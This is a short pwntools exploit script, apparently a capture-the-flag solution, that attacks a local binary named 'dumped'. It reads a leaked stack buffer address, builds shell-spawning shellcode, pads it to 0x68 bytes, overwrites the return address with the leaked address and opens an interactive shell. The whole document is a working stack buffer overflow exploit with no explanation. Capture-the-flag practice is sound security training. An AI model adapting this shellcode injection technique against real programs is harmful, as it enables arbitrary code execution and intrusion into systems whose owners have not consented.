from pwn import *

num = b"10"
elf = ELF("./dumped")
context.binary = elf

shell = asm(shellcraft.sh())
log.info(f"{shell}")
p = elf.process()
p.sendline(num)

p.recvuntil(b"You are dumping your trash in dumpster number: ")
x = p.recvline().strip()
x = int(x.decode(), 16)

log.info(f"Buffer {x}")
payload = shell + b"A" * (0x68 - len(shell)) + p64(x)
p.sendline(payload)
p.interactive()
